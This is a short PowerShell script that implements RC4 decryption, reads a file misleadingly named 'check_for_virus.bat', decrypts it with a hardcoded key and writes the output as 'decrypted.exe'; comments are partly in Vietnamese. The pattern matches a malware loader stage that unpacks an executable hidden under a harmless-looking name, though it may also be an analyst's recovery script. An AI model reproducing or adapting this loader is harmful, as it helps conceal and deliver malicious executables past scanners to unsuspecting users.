function Invoke-RC4Decrypt {
    [CmdletBinding()]
    param (
        [Parameter(Mandatory = $true)]
        [byte[]]$EncryptedData,
        
        [Parameter(Mandatory = $true)]
        [byte[]]$Key
    )
    
    # Create RC4 state array (S-box)
    $S = New-Object byte[] 256
    for ($i = 0; $i -lt 256; $i++) {
        $S[$i] = $i
    }
    
    # Key scheduling algorithm (KSA)
    $j = 0
    for ($i = 0; $i -lt 256; $i++) {
        $j = ($j + $S[$i] + $Key[$i % $Key.Length]) % 256
        # Swap S[i] and S[j]
        $temp = $S[$i]
        $S[$i] = $S[$j]
        $S[$j] = $temp
    }
    
    # Pseudo-random generation algorithm (PRGA) and decryption
    $i = $j = 0
    $result = New-Object byte[] $EncryptedData.Length
    
    for ($k = 0; $k -lt $EncryptedData.Length; $k++) {
        $i = ($i + 1) % 256
        $j = ($j + $S[$i]) % 256
        
        # Swap S[i] and S[j]
        $temp = $S[$i]
        $S[$i] = $S[$j]
        $S[$j] = $temp
        
        # Generate keystream byte and XOR with encrypted byte
        $keyStreamByte = $S[($S[$i] + $S[$j]) % 256]
        $result[$k] = $EncryptedData[$k] -bxor $keyStreamByte
    }
    
    return $result
}

# Doc file
$encryptedBytes = [System.IO.File]::ReadAllBytes(".\check_for_virus.bat")

$key = '43cnbnm4hi9mv1sv'
# Convert string key to byte array
$keyBytes = [System.Text.Encoding]::ASCII.GetBytes($key)

# Decrypt the data
$decryptedBytes = Invoke-RC4Decrypt -EncryptedData $encryptedBytes -Key $keyBytes

# Luu file vao
[System.IO.File]::WriteAllBytes(".\decrypted.exe", $decryptedBytes)
